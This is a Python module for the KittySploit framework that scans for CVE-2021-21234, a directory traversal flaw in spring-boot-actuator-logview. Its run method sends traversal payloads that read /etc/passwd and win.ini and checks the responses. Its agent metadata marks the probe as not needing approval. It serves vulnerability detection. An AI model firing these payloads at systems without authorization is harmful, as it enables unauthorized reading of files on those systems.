#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""spring-boot-actuator-logview before version 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Boot Actuator Logview Directory Traversal Detection',
        'description': 'spring-boot-actuator-logview before version 0.2.13 contains a directory traversal vulnerability in libraries that adds a simple logfile viewer as a spring boot actuator endpoint (maven package "eu.hinsch:spring-boot-actuator-logview".',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'springboot', 'lfi', 'actuator', 'spring-boot-actuator-logview_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234',
            'https://github.com/cristianeph/vulnerability-actuator-log-viewer',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21234',
            'https://github.com/lukashinsch/spring-boot-actuator-logview/commit/760acbb939a8d1f7d1a7dfcd51ca848eea04e772',
            'https://github.com/lukashinsch/spring-boot-actuator-logview/commit/1c76e1ec3588c9f39e1a94bf27b5ff56eb8b17d6',
        ],
        'cve': 'CVE-2021-21234',
    }

    def run(self):
        for path in ('/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../', '/log/view?filename=/windows/win.ini&base=../../../../../../../../../../', '/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../', '/log/view?filename=/etc/passwd&base=../../../../../../../../../../'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('bit app support', 'fonts', 'extensions',)
            header_any = ('text/plain',)
            body_regexes = ('root:.*:0:0:',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason='Spring Boot Actuator Logview Directory Traversal detected',
                    path=path,
                )
                return True
        return False

